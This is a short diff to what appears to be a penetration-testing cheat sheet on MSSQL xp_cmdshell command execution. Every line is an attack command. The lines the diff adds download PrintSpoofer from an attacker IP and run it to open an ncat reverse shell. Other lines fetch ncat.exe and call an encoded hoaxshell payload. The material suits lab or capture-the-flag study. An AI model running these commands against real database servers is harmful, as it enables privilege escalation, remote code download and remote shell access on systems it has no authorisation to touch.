@@ -162,8 +162,8 @@ RECONFIGURE
 --  Execution de commande (after enabling it)
 xp_cmdshell whoami
 xp_cmdshell whoami /priv
-xp_cmdshell "powershell iwr http://x.x.x.x/PrintSpoofer64.exe -o $($env:Temp)\PrintSpoofer.exe";
-xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";
+xp_cmdshell "powershell iwr http://10.10.14.145/PrintSpoofer64.exe -o $($env:Temp)\PrintSpoofer.exe";
+xp_cmdshell %Temp%\PrintSpoofer.exe -c "%TEMP%\ncat.exe 10.10.14.145 1337 -e cmd";
 xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";
 
 xp_cmdshell "powershell -e <hoaxshell payload>";
